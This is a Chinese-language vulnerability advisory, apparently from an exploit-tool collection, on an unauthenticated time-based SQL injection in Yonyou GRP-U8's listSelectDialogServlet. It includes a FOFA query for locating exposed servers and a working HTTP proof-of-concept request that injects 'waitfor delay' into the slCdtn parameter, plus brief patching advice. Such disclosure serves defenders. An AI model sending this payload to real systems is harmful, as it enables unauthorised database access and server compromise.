---
fofa: "app=\"用友-GRP-U8\""
source: "OA-EXPTOOL/Lucifer1993"
---

# 用友 GRP-U8 listSelectDialogServlet SQL注入漏洞

# 漏洞描述

用友 GRP-U8 listSelectDialogServlet 接口 slCdtn 参数存在 SQL 延迟注入漏洞。攻击者无需认证即可通过构造恶意请求执行任意 SQL 语句，可查询数据、下载数据、写入 webshell、执行系统命令等。

# 影响版本

用友 GRP-U8

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：app="用友-GRP-U8"

POC/EXP：

```
GET /listSelectDialogServlet?slType=slFZX&slCdtn=1=2;waitfor delay '0:0:2' HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
```

通过在 slCdtn 参数中注入 `waitfor delay` 时间盲注语句，根据响应延迟判断注入是否成功，进而可利用 MSSQL 时间盲注/报错注入逐字提取数据库内容。

# 漏洞修复

联系用友官方获取安全补丁，对 slCdtn 等外部输入参数使用预编译语句并做严格过滤。
